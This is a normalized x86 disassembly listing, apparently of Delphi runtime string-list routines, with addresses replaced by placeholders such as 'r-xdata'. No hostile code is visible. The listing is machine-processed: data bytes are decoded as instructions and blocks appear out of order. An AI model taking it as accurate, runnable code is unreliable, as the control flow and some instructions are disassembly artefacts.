mov eax [ ebp - 0x4 ]
mov [ ebp - 0x114 ] eax
mov [ ebp - 0x110 ] 0xb
lea edx [ ebp - 0x104 ]
mov eax [ ebx ]
call sub_40316c
lea eax [ ebp - 0x104 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0x4
lea eax [ ebp - 0x114 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9bc
call sub_4039a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a811
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
sub_41a830
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_41a8c5
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x104 ]
mov eax [ ebx ]
call sub_40316c
lea edx [ ebp - 0x104 ]
mov eax edi
call sub_4041d0
mov eax ebx
mov si 0xffff
call sub_403418
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a8cc
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
mov eax ebx
mov si 0xffff
call sub_403418
lea edx [ ebp - 0x4 ]
mov si 0xfffe
call sub_403418
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push [ ebp - 0x4 ]
push r-xdata
push [ edi ]
mov eax edi
mov edx 0x3
call sub_4042ec
sub_41a8d7
inc [ ecx ]
add [ eax ] al
add [ esi ] ch
add [ eax ] al
add [ ebx ] dh
rol bl 0x90
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_403470
mov eax ebx
mov si 0xffff
call sub_403418
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffff
call sub_403418
push eax
lea eax [ ebx + 0x4 ]
call sub_40599c
mov ecx eax
mov edx r-xdata
pop eax
call sub_4032d0
sub_41a922
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
or eax 0xffffffff
mov eax [ eax + 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
jmp r-xdata
pop ebp
retn 0x4
sub_41a974
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_4032d0
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_41a99c
push ebx
push ecx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ ebx + 0x4 ]
call [ eax + 0x1c ]
mov [ esp ] eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ esp ]
pop edx
pop ebx
retn
sub_41a9bc
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_41aa16
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
cmp [ ebx + 0x8 ] 0x0
jg r-xdata
mov eax ebx
call sub_41a284
call sub_40321c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
sub_41aa24
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41b57c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41a714
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_41aa54
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
mov ecx ebp
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
sub_41aa78
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov esi eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_41aa9c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41ab43
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41abec
xor eax eax
push ebp
push sub_41ab26
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ab2d
mov eax [ ebp - 0x4 ]
call sub_41aca8
retn
inc esi
xor ebx ebx
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0xc ]
push eax
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov eax [ ebp - 0x4 ]
pop edx
mov edi [ eax ]
call [ edi + 0x3c ]
inc ebx
dec esi
jne r-xdata
sub_41ab54
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41a740
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41abec
xor eax eax
push ebp
push sub_41abd4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov esi ebx
mov al [ esi + 0x4 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] al
mov al [ esi + 0x7 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x7 ] al
mov al [ esi + 0x6 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x6 ] al
mov al [ esi + 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5 ] al
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41aca8
retn
sub_41ac04
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x20 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
setg bl
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_41acbc
mov ebx eax
xor bl 0x1
jmp r-xdata
sub_41ac5c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push sub_41b414
mov eax [ ebp - 0x8 ]
push eax
push sub_41b6c4
push ebp
call sub_41ac04
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41acbc
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41ad51
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp ebx eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ad58
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_403f90
retn
mov esi ebx
dec esi
test esi esi
jl r-xdata
mov [ ebp - 0x9 ] 0x1
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x14 ]
pop eax
call sub_404378
jne r-xdata
sub_41ad68
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
call sub_41ad64
push eax
mov [ esp + 0x4 ] esi
mov [ esp + 0x8 ] 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b900
jmp sub_4039a8
sub_41ada0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41ade8
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_405e60
mov edx [ ebp - 0x4 ]
mov ecx edi
mov eax ebx
call sub_41ad68
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41adef
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
sub_41adf8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41aed0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41abec
xor eax eax
push ebp
push sub_41aeae
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ ebp - 0x8 ] eax
lea ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x20 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41aeb5
mov eax [ ebp - 0x4 ]
call sub_41aca8
retn
sub_41aeec
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41af31
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_40442c
call sub_408a9c
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41af38
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
sub_41af40
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41b04b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0x10 ] eax
xor ebx ebx
lea eax [ ebp - 0x1c ]
mov edx r-xdata
call sub_404004
mov esi [ ebp - 0x10 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x8 ]
mov ecx ebx
xor edx edx
call sub_40405c
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
mov esi [ ebp - 0x10 ]
dec esi
test esi esi
jl r-xdata
inc esi
mov [ ebp - 0xc ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b052
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_403f90
retn
inc esi
mov [ ebp - 0xc ] 0x0
lea ecx [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x20 ]
call sub_40422c
mov edi eax
mov eax [ ebp - 0x1c ]
call sub_40422c
add edi eax
add ebx edi
inc [ ebp - 0xc ]
dec esi
jne r-xdata
mov eax [ ebp - 0x1c ]
call sub_40422c
mov ebx eax
test ebx ebx
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
mov ecx ebx
call sub_402988
add [ ebp - 0x14 ] ebx
inc [ ebp - 0xc ]
dec esi
jne r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x1c ]
mov ecx ebx
call sub_402988
add [ ebp - 0x14 ] ebx
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x18 ]
call sub_40422c
mov ebx eax
test ebx ebx
je r-xdata
sub_41b068
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41b0e0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov [ ebp - 0x8 ] 0xffffffff
inc esi
mov [ ebp - 0x8 ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b0e7
lea eax [ ebp - 0xc ]
call sub_403f6c
retn
inc [ ebp - 0x8 ]
dec esi
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x34 ]
test eax eax
je r-xdata
sub_41b0f4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41b1b7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
mov [ ebp - 0x8 ] 0xffffffff
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec [ ebp - 0x10 ]
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov ecx esi
dec ecx
mov edx 0x1
mov eax [ ebp - 0xc ]
call sub_40448c
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x34 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0xc ]
mov eax ebx
call sub_41b754
mov edx eax
lea eax [ ebp - 0x14 ]
call sub_404154
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
call sub_40c570
mov esi eax
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b1be
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_403f90
lea eax [ ebp - 0xc ]
call sub_403f6c
retn
sub_41b1c8
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
or esi 0xffffffff
inc ebx
xor esi esi
mov eax esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp ebp eax
je r-xdata
sub_41b1fc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov ecx [ ebp + 0x8 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x24 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_41b22c
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0x20
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_41c290
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41b274
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x6c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b27b
mov eax [ ebp - 0x4 ]
call sub_40321c
retn
sub_41b280
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41b31d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41abec
xor eax eax
push ebp
push sub_41b300
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov esi eax
mov eax ebx
call sub_41bddc
sub esi eax
lea eax [ ebp - 0x8 ]
mov ecx esi
xor edx edx
call sub_40405c
mov edx [ ebp - 0x8 ]
mov ecx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b307
mov eax [ ebp - 0x4 ]
call sub_41aca8
retn
sub_41b32c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41b3cd
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b3d4
lea eax [ ebp - 0x8 ]
call sub_403f6c
retn
mov eax [ ebp - 0x4 ]
call sub_41abec
xor eax eax
push ebp
push sub_41b3b0
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
push edi
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x64 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41aca8
retn
sub_41b3dc
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] ecx
mov edi edx
mov esi eax
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ebp eax
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
push ebp
mov ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x64 ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_41b414
push ebp
mov ebp esp
add esp 0xfffffff4
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41b4b8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_41dfcc
mov eax [ ebp - 0x4 ]
call sub_41abec
xor eax eax
push ebp
push sub_41b493
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
call sub_41d068
test al al
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41ec6c
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b49a
mov eax [ ebp - 0x4 ]
call sub_41aca8
retn
sub_41b4c4
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0xffff
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_41c290
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41b50f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x78 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b516
mov eax [ ebp - 0x4 ]
call sub_40321c
retn
sub_41b51c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41b569
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_40422c
mov ecx eax
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_41c040
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b570
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
sub_41b57c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0xc ] 0x0
je r-xdata
lea eax [ ebx + 0xc ]
mov edx esi
call sub_4059b4
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx + 0x10 ]
pop esi
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0xc ]
mov ecx [ eax ]
call [ ecx + 0xc ]
sub_41b5b0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41b5f3
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_404164
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b5fa
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
sub_41b600
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41b6b4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41abec
xor edx edx
push ebp
push sub_41b697
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b69e
mov eax [ ebp - 0x4 ]
call sub_41aca8
retn
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax ebx
jmp r-xdata
mov dl [ ebx ]
test dl dl
je r-xdata
mov ecx ebx
sub ecx eax
lea edx [ ebp - 0x8 ]
xchg edx eax
call sub_40405c
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
cmp [ ebx ] 0xd
jne r-xdata
sub dl 0xa
je r-xdata
cmp [ ebx ] 0xa
jne r-xdata
inc ebx
sub dl 0x3
jne r-xdata
inc ebx
inc ebx
sub_41b6c4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41b73a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_41f818
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x8 ]
call sub_41f820
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b741
lea eax [ ebp - 0xc ]
call sub_403f6c
retn
inc ebx
xor esi esi
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41f8c0
inc esi
dec ebx
jne r-xdata
sub_41b76c
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x7 ]
jne r-xdata
or [ esi + 0x4 ] 0x4
mov [ esi + 0x7 ] bl
test [ esi + 0x4 ] 0x4
jne r-xdata
pop esi
pop ebx
retn
sub_41b788
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
xor eax eax
mov [ esi + 0x20 ] eax
mov [ esi + 0x24 ] eax
xor eax eax
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41aa24
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x14 ] eax
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
test bl bl
jle r-xdata
mov ecx eax
mov eax [ esi + 0x10 ]
mov edx [ r-xdata ]
call sub_404a20
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_41b7f0
push ebx
push esi
push edi
push ebp
push ecx
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x8c ]
test al al
je r-xdata
mov eax [ ebx + 0x14 ]
mov [ esp ] eax
jmp r-xdata
push edi
mov ecx esi
mov edx [ esp + 0x4 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x88 ]
mov al [ ebx + 0x1d ]
sub al 0x1
jb r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
dec al
je r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_41ada0
jmp r-xdata
sub_41b88c
push ebx
mov ebx eax
cmp [ ebx + 0x14 ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
mov ecx [ ebx + 0x14 ]
mov edx [ r-xdata ]
call sub_404a20
xor eax eax
mov [ ebx + 0x14 ] eax
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
sub_41b8cc
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_41ada0
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop esi
pop ebx
retn
sub eax esi
mov ecx eax
shl ecx 0x3
mov eax [ ebx + 0x10 ]
